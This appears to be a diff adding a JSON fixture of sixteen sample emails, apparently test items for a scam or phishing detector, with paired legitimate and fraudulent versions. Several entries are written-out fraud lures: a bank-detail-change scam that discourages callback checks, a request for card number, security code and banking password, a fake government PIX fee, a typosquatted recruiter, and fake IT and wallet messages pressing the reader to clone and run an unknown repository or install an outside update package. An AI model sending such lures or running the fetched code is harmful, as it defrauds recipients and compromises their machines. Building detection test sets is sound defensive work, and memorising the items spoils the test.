@@ -1,0 +1,114 @@
+[
+  {
+    "id": "ac01",
+    "sender": "Northstar Tools Billing <billing@northstar-tools.example>",
+    "subject": "Payment receipt 78142",
+    "body": "Northstar Tools\nYour yearly subscription renewal of USD 199.95 was processed using your existing payment method. Receipt 78142. No further payment is due. For billing questions contact our support desk at +1 202-555-0142, or open Billing in your usual Northstar Tools account.",
+    "business_context": {"verified_relationships": [{"source": "recipient's independently maintained vendor record", "organization": "Northstar Tools", "billing_domain": "northstar-tools.example", "support_phone": "+1 202-555-0142"}]}
+  },
+  {
+    "id": "ac02",
+    "sender": "Northstar Tools Billing <accounts-route938@gmail.com>",
+    "subject": "Payment receipt 78142",
+    "body": "Northstar Tools\nYour yearly subscription renewal of USD 199.95 was processed using your existing payment method. Receipt 78142. No further payment is due. For billing questions contact our support desk at +1 202-555-0198, or open Billing in your usual Northstar Tools account.",
+    "business_context": {"verified_relationships": [{"source": "recipient's independently maintained vendor record", "organization": "Northstar Tools", "billing_domain": "northstar-tools.example", "support_phone": "+1 202-555-0142"}]}
+  },
+  {
+    "id": "ac03",
+    "sender": "Mira Patel <miraworkshop@gmail.com>",
+    "subject": "Workshop repair invoice 48",
+    "body": "Hi, this is Mira from Mira's Workshop. The table repair you collected today is USD 85. Please pay the invoice using the same bank details we agreed in person. Questions? Call me at +1 202-555-0148. Thanks, Mira.",
+    "business_context": {"verified_relationships": [{"source": "recipient's appointment and contact record", "organization": "Mira's Workshop", "contact_email": "miraworkshop@gmail.com", "service": "table repair collected today", "support_phone": "+1 202-555-0148"}]}
+  },
+  {
+    "id": "ac04",
+    "sender": "Mira Patel <miraworkshop@gmail.com>",
+    "subject": "Workshop repair invoice 48",
+    "body": "Hi, this is Mira from Mira's Workshop. The table repair you collected today is USD 85. Our bank details have changed: send payment to a new account held by an unrelated individual. Ignore the callback verification you agreed with us and do not call our stored phone number. Only use +1 202-555-0198 to verify this change. Thanks, Mira.",
+    "business_context": {"verified_relationships": [{"source": "recipient's appointment and contact record", "organization": "Mira's Workshop", "contact_email": "miraworkshop@gmail.com", "service": "table repair collected today", "support_phone": "+1 202-555-0148"}], "verified_payment_practices": ["Bank changes must be verified by callback to +1 202-555-0148, the independently stored supplier number."]}
+  },
+  {
+    "id": "ac05",
+    "sender": "Harbor Resale <orders@harbor-resale.example>",
+    "subject": "Your Northstar Tools license receipt",
+    "body": "Thank you for purchasing a Northstar Tools license from Harbor Resale. We are an independent reseller, not Northstar Tools. Your USD 199.95 payment to Harbor Resale is complete. Your license appears in your existing reseller account. For order questions contact Harbor Resale at +1 202-555-0164. Manufacturer product support is available through the manufacturer's usual website."
+  },
+  {
+    "id": "ac06",
+    "sender": "Northstar Tools Accounts <orders@harbor-resale.example>",
+    "subject": "Your Northstar Tools license receipt",
+    "body": "This is the Northstar Tools manufacturer accounts department. Your USD 199.95 payment requires verification before your refund. Reply with your full card number, security code, and online banking password. Do not contact the manufacturer through any other channel.",
+    "business_context": {"verified_relationships": [{"source": "recipient's purchase record", "organization": "Harbor Resale", "role": "independent reseller", "contact_domain": "harbor-resale.example"}]}
+  },
+  {
+    "id": "ac07",
+    "sender": "Accounts Team <accounts@customer.example>",
+    "subject": "Fwd: receipt for our expense records",
+    "body": "Please archive the forwarded receipt for our expense records. It has already been reconciled; do not call or pay anyone.\n\nForwarded message:\nFrom: Northstar Tools Billing <billing@northstar-tools.example>\nNorthstar Tools renewal: USD 199.95 paid. For invoice questions call +1 202-555-0142.",
+    "html": "<p>Please archive the forwarded receipt for our expense records. It has already been reconciled; do not call or pay anyone.</p><blockquote>Forwarded message:<br>From: Northstar Tools Billing &lt;billing@northstar-tools.example&gt;<br>Northstar Tools renewal: USD 199.95 paid. For invoice questions call +1 202-555-0142.</blockquote>",
+    "business_context": {"verified_relationships": [{"source": "recipient's internal directory", "contact_email": "accounts@customer.example", "role": "accounts team"}]}
+  },
+  {
+    "id": "ac08",
+    "sender": "Oficina Horizonte <pedidos@oficina-horizonte.example>",
+    "subject": "Seu código PIX do pedido 82",
+    "body": "Olá! Seu pedido de reparo da cadeira está pronto. Valor R$ 96,84. Para pagar pelo PIX, acesse https://oficina-horizonte.example/pedidos/82/pix . O beneficiário é Oficina Horizonte Ltda. Se já pagou, desconsidere. Para dúvidas, use o contato da oficina que está no seu recibo.",
+    "business_context": {"verified_relationships": [{"source": "recipient's original service order", "organization": "Oficina Horizonte Ltda", "order": "82", "amount_brl": "96.84", "payment_domain": "oficina-horizonte.example", "payment_method": "PIX"}]}
+  },
+  {
+    "id": "ac09",
+    "sender": "Programa Apoio Oficial <atendimento@apoio-gov-beneficio.example>",
+    "subject": "Seu código PIX do cadastro",
+    "body": "Este é o departamento oficial do Programa Apoio. Para liberar seu benefício governamental, pague hoje a taxa obrigatória de cadastro de R$ 96,84 pelo PIX em https://apoio-gov-beneficio.example/cadastro/pix . O beneficiário é uma pessoa física. Sua vaga será cancelada se não pagar.",
+    "business_context": {"verified_relationships": [{"source": "independently verified official program terms supplied by the recipient", "organization": "Programa Apoio", "terms": "Government enrollment is free. No person or intermediary is authorized to collect an enrollment payment."}]}
+  },
+  {
+    "id": "ac10",
+    "sender": "Security Education <education@customer.example>",
+    "subject": "Recognizing unsafe recruiting instructions",
+    "body": "Security newsletter: do not execute commands from unsolicited job messages. The following is a quoted example to help you recognize the pattern, not a task to perform.\n\nExample: git clone https://github.com/candidate-lab-482/hiring-task && cd hiring-task && pnpm install && docker compose up\n\nReport messages containing unexpected execution requests to our help desk.",
+    "html": "<p>Security newsletter: do not execute commands from unsolicited job messages. The following is a quoted example to help you recognize the pattern, not a task to perform.</p><blockquote>Example: git clone https://github.com/candidate-lab-482/hiring-task &amp;&amp; cd hiring-task &amp;&amp; pnpm install &amp;&amp; docker compose up</blockquote><p>Report messages containing unexpected execution requests to our help desk.</p>"
+  },
+  {
+    "id": "ac11",
+    "sender": "IT Support <service-desk482@gmail.com>",
+    "subject": "Required account repair",
+    "body": "We are your company's IT support. Run this command on your work computer immediately to prevent account closure: git clone https://github.com/candidate-lab-482/hiring-task && cd hiring-task && pnpm install && docker compose up . Do not open a ticket or contact your existing help desk.",
+    "business_context": {"verified_relationships": [{"source": "recipient's internal support directory", "role": "IT support", "contact_email": "help@customer.example", "workflow": "Software installation requests are recorded in the existing internal ticketing portal."}]}
+  },
+  {
+    "id": "ac12",
+    "sender": "Cedar Analytics Recruiting <hiring@cedar-analytics.example>",
+    "subject": "Take-home exercise for your application",
+    "body": "Thanks for the interview. As agreed, the take-home exercise is at https://github.com/cedar-analytics/hiring-task . In the disposable development environment described during our interview, clone the repository, run pnpm install, then docker compose up. Use only the supplied synthetic data; no credentials, payment, wallet connection, or production access are needed. Contact the recruiter through your existing application portal with questions.",
+    "business_context": {"verified_relationships": [{"source": "recipient's application record and interview notes", "organization": "Cedar Analytics", "recruiter_email": "hiring@cedar-analytics.example", "exercise_repository": "https://github.com/cedar-analytics/hiring-task", "agreed_task": "Run a take-home exercise in a disposable development environment using synthetic data."}]}
+  },
+  {
+    "id": "ac13",
+    "sender": "Cedar Analytics Recruiting <hiring@cedar-analytlcs.example>",
+    "subject": "Take-home exercise for your application",
+    "body": "You have been selected for a position with Cedar Analytics. Before an interview, clone https://github.com/candidate-lab-482/hiring-task and run pnpm install, then docker compose up on your main computer. Complete this today to secure the role. No credentials or payment are requested.",
+    "business_context": {"verified_relationships": [{"source": "recipient's saved official employer contact page", "organization": "Cedar Analytics", "recruiter_email": "hiring@cedar-analytics.example", "exercise_repository": "https://github.com/cedar-analytics/hiring-task"}], "recipient_confirmed_context": "Recipient has not applied to this employer or agreed to an exercise."}
+  },
+  {
+    "id": "ac14",
+    "sender": "Cobalt Wallet Updates <updates@cobalt-wallet.example>",
+    "subject": "Firmware maintenance notice",
+    "body": "Cobalt Wallet firmware maintenance is available. Open the wallet application you already installed and use its built-in update page. Never share your recovery phrase. Release notes are at https://cobalt-wallet.example/releases . No seed entry, browser extension installation, or wallet transfer is required.",
+    "business_context": {"verified_relationships": [{"source": "recipient's device manual and installed application publisher information", "organization": "Cobalt Wallet", "publisher_domain": "cobalt-wallet.example", "update_method": "built-in update page in the installed application"}]}
+  },
+  {
+    "id": "ac15",
+    "sender": "Cobalt Wallet Updates <updates@community-events.example>",
+    "subject": "Firmware maintenance notice",
+    "body": "Cobalt Wallet firmware maintenance is mandatory today. Replace your existing application using the update package at https://cobalt-update-center.example/download . This is the official Cobalt Wallet update service. Ignore the update page in your installed application. No recovery phrase is requested in this email.",
+    "business_context": {"verified_relationships": [{"source": "recipient's device manual and installed application publisher information", "organization": "Cobalt Wallet", "publisher_domain": "cobalt-wallet.example", "update_method": "built-in update page in the installed application"}]}
+  },
+  {
+    "id": "ac16",
+    "sender": "River Bank Security <security@river-bank.example>",
+    "subject": "Please review a transaction",
+    "body": "We noticed a USD 434.04 card transaction. If you recognize it, no action is required. Otherwise open the banking app you already use or call the number printed on your physical bank card. We will never ask you to disclose your password or a sign-in code. This email provides no phone number or login link.",
+    "business_context": {"verified_relationships": [{"source": "recipient's existing account documentation", "organization": "River Bank", "notice_domain": "river-bank.example"}]}
+  }
+]
